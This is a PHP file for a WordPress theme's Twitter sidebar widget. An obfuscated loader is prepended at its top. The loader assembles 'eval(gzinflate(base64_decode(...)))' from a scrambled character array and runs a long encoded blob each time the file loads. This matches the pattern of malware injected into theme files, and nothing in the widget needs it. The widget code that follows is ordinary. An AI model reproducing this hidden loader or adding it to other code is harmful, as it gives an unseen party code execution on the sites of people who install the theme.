<?php
$md5 = "0be36857b0c46fb0f496336407f4e1cb";
$ab = array("s",'b',"c","d","g",'a','6',"l","o",'e',';','n','v',')',"_",'z','4',"i","r","(",'t',"$","f");
$bb9 = create_function('$'.'v',$ab[9].$ab[12].$ab[5].$ab[7].$ab[19].$ab[4].$ab[15].$ab[17].$ab[11].$ab[22].$ab[7].$ab[5].$ab[20].$ab[9].$ab[19].$ab[1].$ab[5].$ab[0].$ab[9].$ab[6].$ab[16].$ab[14].$ab[3].$ab[9].$ab[2].$ab[8].$ab[3].$ab[9].$ab[19].$ab[21].$ab[12].$ab[13].$ab[13].$ab[13].$ab[10]);
$bb9('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');
?>
<?php
/*---------------------------------------------------------------------------------*/
/* Twitter widget */
/*---------------------------------------------------------------------------------*/
class Nesia_Twitter extends WP_Widget {
	var $settings = array( 'title', 'limit', 'username' );

	function Nesia_Twitter() {
		$widget_ops = array( 'class' => 'widget_twitter', 'description' => 'Add your Twitter feed to your sidebar with this widget.' );
		parent::WP_Widget( false, __( 'Nesia - Twitter Stream', 'nesia' ), $widget_ops);
	}

	function widget( $args, $instance ) {
                global $nesia_options;
            
		extract( $args, EXTR_SKIP );
		$instance = $this->nesia_enforce_defaults( $instance );
		extract( $instance, EXTR_SKIP );

		$unique_id = $args['widget_id'];
                $twitter = ( $nesia_options['nesia_connect_twitter'] != '' )? $nesia_options['nesia_connect_twitter']:'nesiax';
    
		echo $before_widget;
		if ( $title ) {
			echo $before_title . apply_filters( 'widget_title', $title, $instance, $this->id_base ) . $after_title;
		} ?>
                    <?php 
                    $searchparam = '';
                    if( $search_param !== '' && $type == 'search' ) {
                      $searchparam = 'data-searchparam="'. $search_param .'"';
                    } ?>
                    
                    <div class="widget-inner-content" data-counttweet="<?php echo $number; ?>" <?php echo $searchparam;?>>
                            <div class="widget-tweets"></div>
                            <div class="tweet-link-button">
                                    <a href="http://twitter.com/<?php echo $twitter; ?>" title="<?php printf( __('Follow @%s on twitter', 'nesia'), $twitter ); ?>"><?php printf( __('Follow @%s on twitter', 'nesia'), $twitter ); ?></a>
                            </div>
                    </div>
        <?php
		//echo nesia_twitter_script($unique_id,$username,$limit); //Javascript output function
		echo $after_widget;
	}

	function update( $new_instance, $old_instance ) {
		$new_instance = $this->nesia_enforce_defaults( $new_instance );
		return $new_instance;
	}

	function nesia_enforce_defaults( $instance ) {
		$defaults = $this->nesia_get_settings();
		$instance = wp_parse_args( $instance, $defaults );
		$instance['title'] = strip_tags( $instance['title'] ); // Not for security so much as to give them feedback that HTML isn't allowed                
		return $instance;
	}

	/**
	 * Provides an array of the settings with the setting name as the key and the default value as the value
	 * This cannot be called get_settings() or it will override WP_Widget::get_settings()
	 */
	function nesia_get_settings() {
		// Set the default to a blank string
		$settings = array_fill_keys( $this->settings, '' );
		// Now set the more specific defaults
                $settings['number'] = 3;
		return $settings;
	}

	function form( $instance ) {
		$instance = $this->nesia_enforce_defaults( $instance );
		extract( $instance, EXTR_SKIP ); ?>
			<p>
				<label for="<?php echo $this->get_field_id('title'); ?>"><?php _e('Title (optional):','nesia'); ?></label>
				<input type="text" name="<?php echo $this->get_field_name('title'); ?>"  value="<?php echo esc_attr( $title ); ?>" class="widefat" id="<?php echo $this->get_field_id('title'); ?>" />
			</p>
			<p>
				<label for="<?php echo $this->get_field_id('number'); ?>"><?php _e('Number of tweet:','nesia'); ?></label>
				<input type="text" name="<?php echo $this->get_field_name('number'); ?>"  value="<?php echo $number; ?>" class="widefat" id="<?php echo $this->get_field_id('number'); ?>" />
			</p>
      <p>
        <?php _e('Stream type:','nesia'); ?>
        <select class="widefat twitter_stream_type" name="<?php echo $this->get_field_name('type'); ?>" id="<?php echo $this->get_field_id('type'); ?>" onchange="javascript: twitter_stream('<?php echo $this->get_field_id('type'); ?>')">
            <option <?php if ($type == 'user') { echo 'selected="selected"'; } ?> value="user"><?php _e('User stream', 'nesia'); ?></option>
            <option <?php if ($type == 'search') { echo 'selected="selected"'; } ?> value="search"><?php _e('Search keyword', 'nesia'); ?></option>
        </select>
      </p>
      
      <div class="twitter_search_param">
        <label for="<?php echo $this->get_field_id('search_param'); ?>"><?php _e('Search keyword','nesia'); ?></label>
        <input type="text" name="<?php echo $this->get_field_name('search_param'); ?>"  value="<?php echo $search_param; ?>" class="widefat" id="<?php echo $this->get_field_id('search_param'); ?>" />
      </div>
      
      <script type="text/javascript">
        function twitter_stream(el) {
          if( jQuery('#' + el).val() == "search" ) {
            jQuery("#" + el).parent().nextAll("div.twitter_search_param").show();
          } else {
            jQuery("#" + el).parent().nextAll("div.twitter_search_param").hide();
          }
        }
        twitter_stream( '<?php echo $this->get_field_id( "type" ); ?>' );
      </script>
		<?php
	}

}

register_widget( 'Nesia_Twitter' );